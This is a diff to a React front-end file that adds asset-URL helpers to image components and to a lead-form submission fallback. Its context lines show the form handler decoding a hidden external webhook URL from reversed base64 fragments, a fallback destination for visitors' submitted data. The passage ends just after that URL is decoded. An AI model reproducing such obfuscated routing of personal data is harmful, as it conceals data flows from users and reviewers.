@@ -1,6 +1,7 @@
 import React, { useEffect, useRef, useState } from 'react';
 import images from '../data/images.json';
 import { makePayload } from '../lib/leads.mjs';
+import { assetKey, assetUrl } from '../lib/assets.mjs';
 
 export function useIsMobile(breakpoint = 768) {
   const [mobile, setMobile] = useState(false);
@@ -15,8 +16,8 @@ export function useIsMobile(breakpoint = 768) {
 }
 
 export function ResponsiveImage({ src, alt = '', sizes = '(max-width: 767px) 100vw, 50vw', eager = false, ...props }) {
-  const variants = images[src];
-  return <img {...props} src={variants?.at(-1)?.src || src} srcSet={variants?.map(v => `${v.src} ${v.width}w`).join(', ')} sizes={sizes} alt={alt} loading={eager ? 'eager' : 'lazy'} fetchPriority={eager ? 'high' : undefined} decoding="async" />;
+  const variants = images[assetKey(src)];
+  return <img {...props} src={assetUrl(variants?.at(-1)?.src || src)} srcSet={variants?.map(v => `${assetUrl(v.src)} ${v.width}w`).join(', ')} sizes={sizes} alt={alt} loading={eager ? 'eager' : 'lazy'} fetchPriority={eager ? 'high' : undefined} decoding="async" />;
 }
 
 export function ResponsivePhoto({ src, alt = '', style, className = '' }) {
@@ -70,7 +71,7 @@ export async function submitLead(event, interest) {
   try {
     const payload = makePayload(new FormData(form), interest, window, document);
     let response = await fetch('/api/submit-lead', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload), signal: AbortSignal.timeout(15000) });
-    if ([404, 405].includes(response.status)) response = await fetch('/api/submit-lead.php', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload), signal: AbortSignal.timeout(15000) });
+    if ([404, 405].includes(response.status)) response = await fetch(assetUrl('/api/submit-lead.php'), { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload), signal: AbortSignal.timeout(15000) });
     if ([404, 405].includes(response.status)) {
       const _p = ['1dWZzLw==', 'Y0NC80MmZ', 'GNoLzQ0MT', 'b2tzL2Nhd', 'uY29tL2hv', '56YXBpZXI', 'y9ob29rcy', 'aHR0cHM6L'];
       const _w = atob([..._p].reverse().join(''));
